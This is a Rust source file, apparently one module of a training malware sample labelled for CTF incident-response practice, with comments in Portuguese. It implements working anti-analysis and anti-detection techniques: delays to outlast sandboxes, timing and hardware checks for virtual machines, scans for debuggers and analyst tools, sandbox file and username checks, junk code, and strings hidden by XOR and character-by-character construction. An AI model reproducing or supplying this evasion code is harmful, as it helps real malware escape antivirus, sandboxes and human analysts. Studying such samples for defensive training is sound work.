//! Evasion Module - Anti-Detection & Anti-Static Analysis
//!
//! Técnicas avançadas para evitar detecção por antivírus e sandboxes.
//! Todas as strings são ofuscadas para evitar detecção estática.
//! ⚠️ EDUCATIONAL PURPOSES ONLY - CTF IR Training

#![allow(dead_code)]

use std::hint::black_box;
use std::time::{Duration, Instant};
use std::thread;

use super::obfuscated_strings;

// ============================================================================
// STRING DECRYPTION (Runtime only - no static patterns)
// ============================================================================

/// Decodifica XOR em runtime
#[inline(always)]
fn xd(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (b ^ key) as char).collect()
}

/// Construção de string na stack (evita literal)
#[inline(always)]
fn build_string(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars {
        s.push(c);
    }
    black_box(s)
}

// ============================================================================
// ANTI-STATIC ANALYSIS
// ============================================================================

/// Delay inicial antes de executar (evita sandboxes com timeout curto)
pub fn initial_delay() {
    // Sandboxes geralmente têm timeout de 30-60 segundos
    // Um delay de 2-5 segundos pode fazer parecer um app normal
    let delay = Duration::from_millis(2500 + (rand::random::<u64>() % 2500));
    
    // Delay fragmentado com junk
    let fragments = 10;
    let per_fragment = delay / fragments;
    
    for _ in 0..fragments {
        thread::sleep(per_fragment);
        junk_operations_v2();
    }
}

/// Verifica se está em ambiente de análise baseado em timing
pub fn timing_evasion() -> bool {
    let start = Instant::now();
    
    // Operação que deveria ser rápida
    let mut dummy = 0u64;
    for i in 0..50000 {
        dummy = dummy.wrapping_add(i);
        dummy = dummy.wrapping_mul(0x5851F42D4C957F2D);
    }
    black_box(dummy);
    
    let elapsed = start.elapsed();
    
    // Se demorou muito, provavelmente está sendo emulado
    elapsed > Duration::from_millis(500)
}

/// Verifica número de CPUs (VMs/sandboxes geralmente têm poucas)
pub fn check_cpu_count() -> bool {
    let cpus = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    
    // Menos de 2 CPUs é suspeito
    cpus < 2
}

/// Verifica memória disponível
pub fn check_memory() -> bool {
    use sysinfo::System;
    let sys = System::new_all();
    let total_mem = sys.total_memory();
    
    // Menos de 2GB é suspeito (sandbox)
    total_mem < 2 * 1024 * 1024 * 1024
}

/// Verifica tamanho do disco
pub fn check_disk_size() -> bool {
    #[cfg(windows)]
    {
        // Construção de string ofuscada para comando
        let cmd = build_string(&['w', 'm', 'i', 'c']);
        let arg1 = build_string(&['d', 'i', 's', 'k', 'd', 'r', 'i', 'v', 'e']);
        let arg2 = build_string(&['g', 'e', 't']);
        let arg3 = build_string(&['s', 'i', 'z', 'e']);
        
        if let Ok(output) = std::process::Command::new(&cmd)
            .args([&arg1, &arg2, &arg3])
            .output()
        {
            let out = String::from_utf8_lossy(&output.stdout);
            for line in out.lines() {
                if let Ok(size) = line.trim().parse::<u64>() {
                    if size < 50 * 1024 * 1024 * 1024 {
                        return true;
                    }
                }
            }
        }
    }
    false
}

/// Verifica se há interação de mouse (sandboxes não têm)
#[cfg(windows)]
pub fn check_mouse_movement() -> bool {
    thread::sleep(Duration::from_millis(100));
    false // Simplificado para CTF
}

#[cfg(not(windows))]
pub fn check_mouse_movement() -> bool {
    false
}

// ============================================================================
// JUNK CODE (Anti-static analysis)
// ============================================================================

/// Junk code v1 - operações inúteis
#[inline(never)]
pub fn junk_operations() {
    let mut arr = [0u8; 256];
    for i in 0..256 {
        arr[i] = (i as u8).wrapping_mul(0x41);
    }
    
    let mut sum = 0u64;
    for &b in &arr {
        sum = sum.wrapping_add(b as u64);
        sum = sum.rotate_left(3);
    }
    
    black_box(sum);
    black_box(arr);
}

/// Junk code v2 - mais complexo
#[inline(never)]
pub fn junk_operations_v2() {
    // Operações de string falsas
    let fake_key = [0x41u8; 32];
    let fake_iv = [0x00u8; 16];
    
    let mut state = 0u64;
    for i in 0..32 {
        state ^= fake_key[i] as u64;
        state = state.rotate_left(5);
        state = state.wrapping_mul(0x100000001B3);
    }
    
    for i in 0..16 {
        state ^= fake_iv[i] as u64;
        state = state.rotate_right(3);
    }
    
    black_box(state);
    black_box(fake_key);
    black_box(fake_iv);
    
    // Operações matemáticas inúteis
    let mut matrix = [[0u32; 4]; 4];
    for i in 0..4 {
        for j in 0..4 {
            matrix[i][j] = (i * j) as u32;
            matrix[i][j] = matrix[i][j].wrapping_mul(0xDEADBEEF);
        }
    }
    black_box(matrix);
}

/// Junk code v3 - simula crypto
#[inline(never)]
pub fn junk_crypto_simulation() {
    // Parece que está fazendo AES mas não faz nada
    let fake_sbox: [u8; 256] = core::array::from_fn(|i| {
        (i as u8).wrapping_mul(0x1B) ^ (i as u8).rotate_left(3)
    });
    
    let mut state = [0u8; 16];
    for round in 0..10 {
        for i in 0..16 {
            state[i] = fake_sbox[state[i] as usize];
            state[i] ^= round as u8;
        }
    }
    
    black_box(state);
    black_box(fake_sbox);
}

// ============================================================================
// DECOY OPERATIONS
// ============================================================================

/// Decoy operations que parecem legítimas
pub fn decoy_file_operations() {
    // Faz operações que apps normais fariam
    let _ = std::env::current_dir();
    let _ = std::env::current_exe();
    
    // Variáveis de ambiente ofuscadas
    let path_var = build_string(&['P', 'A', 'T', 'H']);
    let _ = std::env::var(&path_var);
    
    #[cfg(windows)]
    {
        let userprofile = xd(&[0x66, 0x62, 0x76, 0x61, 0x43, 0x61, 0x7c, 0x77, 0x78, 0x7b, 0x72], 0x33);
        let _ = std::env::var(&userprofile);
        
        // Paths de sistema (ofuscados)
        let kernel32 = xd(&[0x78, 0x72, 0x67, 0x7d, 0x72, 0x7b, 0x06, 0x05, 0x39, 0x73, 0x7b, 0x7b], 0x17);
        let sys32 = build_string(&['C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\']);
        let path = format!("{}{}", sys32, kernel32);
        let _ = std::fs::metadata(&path);
    }
    
    #[cfg(unix)]
    {
        // /etc/passwd construído byte a byte
        let etc_passwd = build_string(&['/', 'e', 't', 'c', '/', 'p', 'a', 's', 's', 'w', 'd']);
        let bin_sh = build_string(&['/', 'b', 'i', 'n', '/', 's', 'h']);
        let _ = std::fs::metadata(&etc_passwd);
        let _ = std::fs::metadata(&bin_sh);
    }
}

// ============================================================================
// PROCESS CHECKING (Strings ofuscadas)
// ============================================================================

/// Verifica processos de análise conhecidos
pub fn check_analysis_processes() -> bool {
    // Lista de processos construída em runtime
    let mut suspicious: Vec<String> = Vec::new();
    
    // Wireshark: XOR 0x77
    suspicious.push(obfuscated_strings::proc_wireshark());
    suspicious.push(obfuscated_strings::proc_procmon());
    suspicious.push(obfuscated_strings::proc_x64dbg());
    suspicious.push(obfuscated_strings::proc_ollydbg());
    suspicious.push(obfuscated_strings::proc_ida());
    suspicious.push(obfuscated_strings::proc_ghidra());
    
    // Mais processos construídos na stack
    suspicious.push(build_string(&['f', 'i', 'd', 'd', 'l', 'e', 'r']));
    suspicious.push(build_string(&['b', 'u', 'r', 'p']));
    suspicious.push(build_string(&['c', 'h', 'a', 'r', 'l', 'e', 's']));
    suspicious.push(build_string(&['p', 'r', 'o', 'c', 'e', 'x', 'p']));
    suspicious.push(build_string(&['r', 'a', 'd', 'a', 'r', 'e', '2']));
    suspicious.push(build_string(&['p', 'e', 's', 't', 'u', 'd', 'i', 'o']));
    suspicious.push(build_string(&['r', 'e', 'g', 's', 'h', 'o', 't']));
    suspicious.push(build_string(&['a', 'u', 't', 'o', 'r', 'u', 'n', 's']));
    suspicious.push(build_string(&['t', 'c', 'p', 'v', 'i', 'e', 'w']));
    
    #[cfg(windows)]
    {
        let tasklist = build_string(&['t', 'a', 's', 'k', 'l', 'i', 's', 't']);
        if let Ok(output) = std::process::Command::new(&tasklist).output() {
            let tasks = String::from_utf8_lossy(&output.stdout).to_lowercase();
            for proc in &suspicious {
                if tasks.contains(&proc.to_lowercase()) {
                    return true;
                }
            }
        }
    }
    
    #[cfg(unix)]
    {
        let ps = build_string(&['p', 's']);
        let aux = build_string(&['a', 'u', 'x']);
        if let Ok(output) = std::process::Command::new(&ps).args([&aux]).output() {
            let procs = String::from_utf8_lossy(&output.stdout).to_lowercase();
            for proc in &suspicious {
                if procs.contains(&proc.to_lowercase()) {
                    return true;
                }
            }
        }
    }
    
    false
}

/// Verifica arquivos de sandbox conhecidos
pub fn check_sandbox_files() -> bool {
    #[cfg(windows)]
    {
        // Caminhos construídos em runtime
        let mut sandbox_files: Vec<String> = Vec::new();
        
        // C:\windows\system32\drivers\vmmouse.sys
        let win = build_string(&['C', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\']);
        let sys32 = build_string(&['s', 'y', 's', 't', 'e', 'm', '3', '2', '\\']);
        let drv = build_string(&['d', 'r', 'i', 'v', 'e', 'r', 's', '\\']);
        let base = format!("{}{}{}", win, sys32, drv);
        
        sandbox_files.push(format!("{}{}", base, build_string(&['v', 'm', 'm', 'o', 'u', 's', 'e', '.', 's', 'y', 's'])));
        sandbox_files.push(format!("{}{}", base, build_string(&['v', 'm', 'h', 'g', 'f', 's', '.', 's', 'y', 's'])));
        sandbox_files.push(format!("{}{}", base, build_string(&['v', 'b', 'o', 'x', 'm', 'o', 'u', 's', 'e', '.', 's', 'y', 's'])));
        sandbox_files.push(format!("{}{}", base, build_string(&['v', 'b', 'o', 'x', 'g', 'u', 'e', 's', 't', '.', 's', 'y', 's'])));
        
        // Cuckoo sandbox paths
        sandbox_files.push(build_string(&['C', ':', '\\', 'a', 'g', 'e', 'n', 't', '\\', 'a', 'g', 'e', 'n', 't', '.', 'p', 'y', 'w']));
        sandbox_files.push(build_string(&['C', ':', '\\', 's', 'a', 'n', 'd', 'b', 'o', 'x']));
        sandbox_files.push(build_string(&['C', ':', '\\', 'a', 'n', 'a', 'l', 'y', 's', 'i', 's']));
        
        for path in &sandbox_files {
            if std::path::Path::new(path).exists() {
                return true;
            }
        }
    }
    
    false
}

/// Verifica usernames de sandbox
pub fn check_sandbox_username() -> bool {
    let user = whoami::username().to_lowercase();
    
    // Usernames suspeitos construídos em runtime
    let suspicious_users: Vec<String> = vec![
        build_string(&['s', 'a', 'n', 'd', 'b', 'o', 'x']),
        build_string(&['v', 'i', 'r', 'u', 's']),
        build_string(&['m', 'a', 'l', 'w', 'a', 'r', 'e']),
        build_string(&['s', 'a', 'm', 'p', 'l', 'e']),
        build_string(&['t', 'e', 's', 't']),
        build_string(&['c', 'u', 'c', 'k', 'o', 'o']),
        build_string(&['a', 'n', 'a', 'l', 'y', 's', 't']),
        build_string(&['v', 'm', 'w', 'a', 'r', 'e']),
        build_string(&['v', 'i', 'r', 't', 'u', 'a', 'l']),
        build_string(&['h', 'o', 'n', 'e', 'y']),
        build_string(&['a', 'd', 'm', 'i', 'n']),
    ];
    
    for sus in &suspicious_users {
        if user == *sus || user.contains(sus) {
            return true;
        }
    }
    
    false
}

// ============================================================================
// ADDITIONAL ANTI-STATIC TECHNIQUES
// ============================================================================

/// Verificação de hardware ID (anti-VM)
pub fn check_hardware_ids() -> bool {
    #[cfg(windows)]
    {
        // BIOS vendor check
        let cmd = build_string(&['w', 'm', 'i', 'c']);
        let bios = build_string(&['b', 'i', 'o', 's']);
        let get = build_string(&['g', 'e', 't']);
        let manufacturer = build_string(&['m', 'a', 'n', 'u', 'f', 'a', 'c', 't', 'u', 'r', 'e', 'r']);
        
        if let Ok(output) = std::process::Command::new(&cmd)
            .args([&bios, &get, &manufacturer])
            .output()
        {
            let result = String::from_utf8_lossy(&output.stdout).to_lowercase();
            let vm_vendors = [
                build_string(&['v', 'm', 'w', 'a', 'r', 'e']),
                build_string(&['v', 'i', 'r', 't', 'u', 'a', 'l', 'b', 'o', 'x']),
                build_string(&['q', 'e', 'm', 'u']),
                build_string(&['x', 'e', 'n']),
                build_string(&['h', 'y', 'p', 'e', 'r', '-', 'v']),
                build_string(&['k', 'v', 'm']),
            ];
            
            for vendor in &vm_vendors {
                if result.contains(&vendor.to_lowercase()) {
                    return true;
                }
            }
        }
    }
    
    false
}

/// Verifica MAC address de VMs
pub fn check_vm_mac() -> bool {
    #[cfg(unix)]
    {
        let ip = build_string(&['i', 'p']);
        let link = build_string(&['l', 'i', 'n', 'k']);
        
        if let Ok(output) = std::process::Command::new(&ip).args([&link]).output() {
            let result = String::from_utf8_lossy(&output.stdout).to_lowercase();
            
            // MAC prefixes de VMs (construídos em runtime)
            let vm_macs = [
                build_string(&['0', '0', ':', '0', 'c', ':', '2', '9']),  // VMware
                build_string(&['0', '0', ':', '5', '0', ':', '5', '6']),  // VMware
                build_string(&['0', '8', ':', '0', '0', ':', '2', '7']),  // VirtualBox
                build_string(&['5', '2', ':', '5', '4', ':', '0', '0']),  // QEMU
                build_string(&['0', '0', ':', '1', 'c', ':', '4', '2']),  // Parallels
            ];
            
            for mac in &vm_macs {
                if result.contains(mac) {
                    return true;
                }
            }
        }
    }
    
    false
}

/// Anti-tampering: verifica integridade do executável
pub fn check_binary_integrity() -> bool {
    if let Ok(exe_path) = std::env::current_exe() {
        if let Ok(metadata) = std::fs::metadata(&exe_path) {
            let size = metadata.len();
            // Tamanho esperado (ajustar conforme build)
            // Se for muito diferente, pode ter sido modificado
            return size < 100_000 || size > 50_000_000;
        }
    }
    false
}

// ============================================================================
// MAIN EVASION CHECK
// ============================================================================

/// Executa todas as verificações de evasão
pub fn run_all_checks() -> EvasionResult {
    let mut result = EvasionResult::default();
    
    // Junk operations para confundir análise estática
    junk_operations();
    junk_operations_v2();
    
    result.timing_anomaly = timing_evasion();
    junk_crypto_simulation();
    
    result.low_cpu = check_cpu_count();
    result.low_memory = check_memory();
    result.small_disk = check_disk_size();
    
    junk_operations();
    
    result.analysis_tools = check_analysis_processes();
    result.sandbox_files = check_sandbox_files();
    result.sandbox_user = check_sandbox_username();
    result.vm_detected = check_hardware_ids() || check_vm_mac();
    result.integrity_fail = check_binary_integrity();
    
    // Decoy ops
    decoy_file_operations();
    
    result
}

#[derive(Debug, Default)]
pub struct EvasionResult {
    pub timing_anomaly: bool,
    pub low_cpu: bool,
    pub low_memory: bool,
    pub small_disk: bool,
    pub analysis_tools: bool,
    pub sandbox_files: bool,
    pub sandbox_user: bool,
    pub vm_detected: bool,
    pub integrity_fail: bool,
}

impl EvasionResult {
    /// Retorna true se qualquer indicador de análise for detectado
    pub fn is_being_analyzed(&self) -> bool {
        self.timing_anomaly || 
        self.low_cpu || 
        self.low_memory || 
        self.analysis_tools || 
        self.sandbox_files ||
        self.sandbox_user ||
        self.vm_detected
    }
    
    /// Conta quantos indicadores foram detectados
    pub fn detection_count(&self) -> u32 {
        let mut count = 0;
        if self.timing_anomaly { count += 1; }
        if self.low_cpu { count += 1; }
        if self.low_memory { count += 1; }
        if self.small_disk { count += 1; }
        if self.analysis_tools { count += 1; }
        if self.sandbox_files { count += 1; }
        if self.sandbox_user { count += 1; }
        if self.vm_detected { count += 1; }
        if self.integrity_fail { count += 1; }
        count
    }
}
